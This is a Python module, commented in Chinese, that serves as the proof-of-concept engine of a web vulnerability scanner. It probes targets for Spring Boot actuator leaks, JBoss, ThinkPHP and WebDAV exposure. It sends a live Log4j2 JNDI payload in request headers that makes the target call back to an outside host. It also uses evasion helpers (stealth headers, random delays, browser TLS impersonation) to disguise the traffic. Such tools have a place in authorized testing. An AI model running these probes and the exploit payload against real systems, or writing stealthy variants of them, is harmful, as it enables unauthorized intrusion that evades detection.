"""
POC引擎：漏洞验证框架
支持优先级、超时控制、置信度评分
"""
from curl_cffi import requests
import time
import json
import os
from typing import Dict, List, Optional
from datetime import datetime
from config import Config
from core.evasion import get_stealth_headers, smart_sleep
from logger import get_logger

# 引入OOB盲打引擎
from core.oob_engine import OOBEngine

logger = get_logger("poc_engine")
oob = OOBEngine()


# ==========================================
# POC 配置和优先级系统
# ==========================================
def _get_default_registry():
    """内置默认POC注册表（当配置文件加载失败时使用）"""
    return {
        "Spring Boot": {
            "priority": 1,
            "confidence_baseline": 0.85,
            "pocs": {
                "check_springboot_actuator": {"severity": "CRITICAL", "confidence": 0.95, "timeout": 3},
                "check_log4j2_oob": {"severity": "CRITICAL", "confidence": 0.90, "timeout": 5}
            }
        },
        "Apache Shiro": {
            "priority": 2,
            "confidence_baseline": 0.80,
            "pocs": {
                "check_shiro_rce": {"severity": "HIGH", "confidence": 0.85, "timeout": 3}
            }
        }
    }

def _load_registry_from_json() -> Dict:
    """从pocs.json动态加载POC配置"""
    try:
        # 定位pocs.json (假设在项目根目录)
        root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        json_path = os.path.join(root_dir, 'pocs.json')
        
        if not os.path.exists(json_path):
            logger.warning(f"[-] 未找到POC配置文件: {json_path}，使用内置默认配置")
            return _get_default_registry()

        with open(json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)

        registry = {}
        
        # 1. 加载框架基础配置
        for fw_name, fw_info in data.get('frameworks', {}).items():
            registry[fw_name] = {
                "priority": fw_info.get('priority', 5),
                "confidence_baseline": fw_info.get('confidence_baseline', 0.5),
                "pocs": {}
            }

        # 2. 加载并注册POC
        loaded_count = 0
        for poc in data.get('pocs', []):
            if not poc.get('enabled', False):
                continue
                
            fw = poc.get('framework')
            if fw not in registry:
                # 如果框架未在frameworks中定义，使用默认值初始化
                registry[fw] = {"priority": poc.get('priority', 5), "confidence_baseline": 0.5, "pocs": {}}
            
            for impl in poc.get('implementations', []):
                registry[fw]['pocs'][impl] = {
                    "severity": poc.get('severity', 'UNKNOWN'),
                    "confidence": poc.get('confidence', 0.5),
                    "timeout": poc.get('timeout', Config.POC_TIMEOUT)
                }
                loaded_count += 1
        
        logger.info(f"[*] POC引擎初始化完成: 从pocs.json加载了 {loaded_count} 个规则")
        return registry

    except Exception as e:
        logger.error(f"[-] 加载POC配置失败: {e}，回退到默认配置")
        return _get_default_registry()

POC_REGISTRY = _load_registry_from_json()


# ==========================================
# POC 实现函数
# ==========================================
def check_springboot_actuator(url: str) -> Optional[Dict]:
    """Spring Boot Actuator 敏感信息泄露"""
    target_url = f"{url.rstrip('/')}/actuator/env"
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()
        res = requests.get(
            target_url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )
        if res.status_code == 200 and "activeProfiles" in res.text:
            return {
                "vuln_name": "Spring Boot Actuator 敏感信息泄露",
                "payload_url": target_url,
                "severity": "CRITICAL",
                "type": "Information Disclosure",
                "discovered_at": datetime.now().isoformat()
            }
    except Exception as e:
        logger.debug(f"  [-] Spring Boot Actuator POC失败: {e}")

    return None


def check_log4j2_oob(url: str) -> Optional[Dict]:
    """Log4j2 JNDI 远程代码执行 (OOB检测)"""
    if not Config.OOB_ENABLED:
        return None

    try:
        unique_id, oob_url = oob.generate_payload()
        payload = f"${{jndi:ldap://{oob_url}/a}}"

        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()
        headers['X-Api-Version'] = payload
        headers['User-Agent'] = payload

        requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )

        # 等待回调
        time.sleep(min(Config.OOB_TIMEOUT, 15))

        if oob.verify(unique_id):
            return {
                "vuln_name": "Log4j2 JNDI 远程代码执行",
                "payload_url": f"Header Injection: {payload}",
                "severity": "CRITICAL",
                "type": "Remote Code Execution",
                "discovered_at": datetime.now().isoformat()
            }
    except Exception as e:
        logger.debug(f"  [-] Log4j2 OOB POC失败: {e}")

    return None


def check_nginx_version(url: str) -> Optional[Dict]:
    """Nginx 版本信息泄露检测"""
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()
        res = requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )

        server_header = res.headers.get('Server', '')
        if 'nginx' in server_header.lower():
            return {
                "vuln_name": f"Nginx {server_header} 版本泄露",
                "payload_url": url,
                "severity": "LOW",
                "type": "Information Disclosure",
                "discovered_at": datetime.now().isoformat()
            }
    except Exception as e:
        logger.debug(f"  [-] Nginx版本检测失败: {e}")

    return None


def check_iis_webdav(url: str) -> Optional[Dict]:
    """IIS WebDAV RCE检测"""
    # 简化版本：检测OPTIONS方法是否暴露WebDAV
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()

        # 尝试OPTIONS请求
        res = requests.options(
            url,
            headers=headers,
            verify=False,
            timeout=Config.POC_TIMEOUT,
            impersonate="chrome120"
        )

        # 检查DAV头部
        allow_header = res.headers.get('Allow', '')
        dav_header = res.headers.get('DAV', '')

        if 'PROPFIND' in allow_header or dav_header:
            return {
                "vuln_name": "IIS WebDAV 可能存在RCE漏洞",
                "payload_url": url,
                "severity": "HIGH",
                "type": "Potential RCE",
                "discovered_at": datetime.now().isoformat()
            }
    except Exception as e:
        logger.debug(f"  [-] IIS WebDAV检测失败: {e}")

    return None


def check_thinkphp_rce(url: str) -> Optional[Dict]:
    """ThinkPHP RCE检测（简化版）"""
    # 这是简化实现，实际需要特定payload
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()

        # ThinkPHP的典型RCE路由
        test_urls = [
            f"{url.rstrip('/')}/index.php?m=Home&c=Index&a=test",
            f"{url.rstrip('/')}/index.php/Home/Index/test",
        ]

        for test_url in test_urls:
            res = requests.get(
                test_url,
                headers=headers,
                verify=False,
                timeout=Config.POC_TIMEOUT,
                impersonate="chrome120"
            )

            if res.status_code == 200 and 'thinkphp' in res.text.lower():
                return {
                    "vuln_name": "ThinkPHP 可能存在RCE漏洞",
                    "payload_url": test_url,
                    "severity": "HIGH",
                    "type": "Potential RCE",
                    "discovered_at": datetime.now().isoformat()
                }
    except Exception as e:
        logger.debug(f"  [-] ThinkPHP RCE检测失败: {e}")

    return None


def check_jboss_deserialization(url: str) -> Optional[Dict]:
    """JBoss 反序列化RCE检测"""
    try:
        smart_sleep(Config.SMART_SLEEP_MIN, Config.SMART_SLEEP_MAX)
        headers = get_stealth_headers()

        # JBoss的典型不安全端点
        jboss_paths = [
            '/jmx-console/',
            '/jbossws/services',
            '/invoker/EJBInvokerServlet',
        ]

        for path in jboss_paths:
            test_url = url.rstrip('/') + path
            try:
                res = requests.head(
                    test_url,
                    headers=headers,
                    verify=False,
                    timeout=Config.POC_TIMEOUT,
                    impersonate="chrome120"
                )

                if res.status_code == 200:
                    return {
                        "vuln_name": f"JBoss {path} 端点暴露",
                        "payload_url": test_url,
                        "severity": "HIGH",
                        "type": "Information Disclosure / Potential RCE",
                        "discovered_at": datetime.now().isoformat()
                    }
            except:
                pass
    except Exception as e:
        logger.debug(f"  [-] JBoss检测失败: {e}")

    return None


# ==========================================
# POC 管理和执行函数
# ==========================================
def run_pocs(url: str, fingerprints: List[str]) -> List[Dict]:
    """
    按优先级执行POC
    基于指纹识别结果执行对应的漏洞检测
    """
    discovered_vulns = []
    executed_pocs = set()  # 避免重复执行同一个POC

    # 按优先级排序指纹
    sorted_fps = sorted(
        fingerprints,
        key=lambda fp: POC_REGISTRY.get(fp, {}).get("priority", 999)
    )

    for fp in sorted_fps:
        if fp not in POC_REGISTRY:
            continue

        poc_config = POC_REGISTRY[fp]
        poc_list = poc_config.get("pocs", {})

        if not poc_list:
            continue

        logger.info(f"    [>] 触发 {fp} 漏洞检测")

        for poc_name, poc_meta in poc_list.items():
            # 避免重复执行相同POC
            if poc_name in executed_pocs:
                continue

            executed_pocs.add(poc_name)

            try:
                # 动态获取POC函数
                poc_func = globals().get(poc_name)
                if not poc_func:
                    logger.warning(f"      [-] POC函数不存在: {poc_name}")
                    continue

                result = poc_func(url)
                if result:
                    discovered_vulns.append(result)
                    confidence = poc_meta.get("confidence", 0.8)
                    logger.info(
                        f"      [!!!] 成功验证: {result['vuln_name']} "
                        f"(置信度: {confidence*100:.0f}%)"
                    )
            except Exception as e:
                logger.debug(f"      [-] POC执行异常 {poc_name}: {e}")

    return discovered_vulns
